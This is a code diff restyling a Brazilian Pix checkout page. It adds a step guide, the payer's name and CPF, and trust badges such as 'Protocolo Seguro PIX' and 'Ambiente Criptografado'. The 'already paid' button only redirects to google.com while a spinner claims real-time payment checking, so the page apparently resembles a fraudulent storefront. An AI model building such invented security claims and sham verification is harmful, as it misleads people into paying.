@@ -616,13 +616,82 @@
         }
 
         .duty-info-section {
-            background: #fff;
+            background: #fcfcfc;
             border: 1px solid var(--border-color);
             border-radius: 14px;
             padding: 15px;
             display: flex;
             flex-direction: column;
             gap: 10px;
+            margin-top: 5px;
+        }
+
+        .pix-steps-guide {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 8px;
+            margin: 5px 0;
+        }
+
+        .pix-step {
+            font-size: 0.7rem;
+            font-weight: 700;
+            color: var(--text-gray);
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .step-num {
+            width: 20px;
+            height: 20px;
+            background: var(--primary);
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.75rem;
+        }
+
+        .pix-security-footer {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 5px;
+            padding: 10px;
+            border-top: 1px solid var(--border-color);
+        }
+
+        .security-item {
+            font-size: 0.65rem;
+            font-weight: 700;
+            color: var(--success);
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .btn-already-paid-alt {
+            background: none;
+            border: 1.5px solid var(--border-color);
+            color: var(--text-gray);
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 0.85rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s;
+            width: 100%;
+            margin-top: 5px;
+        }
+
+        .btn-already-paid-alt:hover {
+            background: var(--bg-light);
+            color: var(--text-dark);
+            border-color: var(--text-gray);
         }
 
         .duty-header {
@@ -1172,21 +1241,19 @@
                             </div>
                             <div id="pix-copy-content" class="pix-copy-section">
                                 <div class="pix-header-status">
-                                    <div class="pix-status-badge"><i class="fas fa-check-circle"></i> Código Gerado</div>
-                                    <div class="pix-timer-container"><i class="fas fa-clock"></i> Expira em: <span id="pix-timer">15:00</span></div>
+                                    <div class="pix-status-badge"><i class="fas fa-shield-check"></i> Pagamento Seguro</div>
+                                    <div class="pix-timer-container"><i class="fas fa-hourglass-half"></i> Expira em: <span id="pix-timer">15:00</span></div>
                                 </div>
-                                <div class="duty-info-section">
-                                    <div class="duty-header"><i class="fas fa-user-shield"></i> Titular da Compra</div>
-                                    <div class="duty-user-data">
-                                        <div class="duty-field"><span class="duty-label">Nome:</span><span class="duty-value" id="display-pix-name">---</span></div>
-                                        <div class="duty-field"><span class="duty-label">CPF:</span><span class="duty-value" id="display-pix-cpf">---</span></div>
 
-                                    </div>
-                                    <div class="duty-warning"><i class="fas fa-info-circle"></i><span>Este código Pix é nominal e vinculado ao seu CPF.</span></div>
+                                <div class="pix-steps-guide">
+                                    <div class="pix-step"><span class="step-num">1</span> Copie o código</div>
+                                    <div class="pix-step"><span class="step-num">2</span> Abra seu banco</div>
+                                    <div class="pix-step"><span class="step-num">3</span> Pague via Pix</div>
                                 </div>
+
                                 <div class="pix-code-display-wrapper">
                                     <div class="pix-code-header">
-                                        <label class="pix-code-label">Código Pix</label>
+                                        <label class="pix-code-label"><i class="fas fa-qrcode"></i> Código Pix Copia e Cola</label>
                                         <span class="pix-code-value-label">R$ ${baseTotal.toFixed(2).replace('.', ',')}</span>
                                     </div>
                                     <div class="pix-code-input-container">
@@ -1194,9 +1261,31 @@
                                         <button class="pix-copy-icon-btn" id="btn-copy-pix-quick" title="Copiar código"><i class="fas fa-copy"></i></button>
                                     </div>
                                 </div>
-                                <button class="btn-copy-pix" id="btn-copy-pix-action">Copiar código</button>
-                                <div class="waiting-payment-section"><div class="modern-spinner"></div><div class="waiting-text">Aguardando Pagamento</div></div>
-                                <button class="btn-modal-continue" id="btn-already-paid" style="margin-top: 10px; padding: 14px; border-radius: 12px; font-size: 0.95rem; border: none; cursor: pointer; width: 100%; font-weight: 800;">Já realizei o pagamento</button>
+
+                                <button class="btn-copy-pix" id="btn-copy-pix-action">
+                                    <i class="fas fa-copy"></i> COPIAR CÓDIGO PIX
+                                </button>
+
+                                <div class="duty-info-section">
+                                    <div class="duty-header"><i class="fas fa-user-lock"></i> Dados do Pagador</div>
+                                    <div class="duty-user-data">
+                                        <div class="duty-field"><span class="duty-label">Nome:</span><span class="duty-value" id="display-pix-name">---</span></div>
+                                        <div class="duty-field"><span class="duty-label">CPF:</span><span class="duty-value" id="display-pix-cpf">---</span></div>
+                                    </div>
+                                    <div class="duty-warning"><i class="fas fa-info-circle"></i><span>Pagamento processado via <strong>Protocolo Seguro PIX</strong>.</span></div>
+                                </div>
+
+                                <div class="waiting-payment-section">
+                                    <div class="modern-spinner"></div>
+                                    <div class="waiting-text">Verificando pagamento em tempo real...</div>
+                                </div>
+
+                                <div class="pix-security-footer">
+                                    <div class="security-item"><i class="fas fa-lock"></i> Ambiente Criptografado</div>
+                                    <div class="security-item"><i class="fas fa-check-double"></i> Liberação Imediata</div>
+                                </div>
+
+                                <button class="btn-already-paid-alt" id="btn-already-paid">Já realizei o pagamento</button>
                             </div>
                         </div>
                         <div class="payment-option-card" id="pay-on-delivery">
@@ -1248,7 +1337,11 @@
             document.getElementById('btn-copy-pix-action').addEventListener('click', copyPixCode);
             const quickCopyBtn = document.getElementById('btn-copy-pix-quick');
             if (quickCopyBtn) quickCopyBtn.addEventListener('click', (e) => { e.preventDefault(); copyPixCode(); });
-            document.getElementById('btn-already-paid').addEventListener('click', () => { window.location.href = 'https://www.google.com'; });
+            
+            const alreadyPaidBtn = document.getElementById('btn-already-paid');
+            if (alreadyPaidBtn) {
+                alreadyPaidBtn.addEventListener('click', () => { window.location.href = 'https://www.google.com'; });
+            }
         }
 
         let timerInterval;
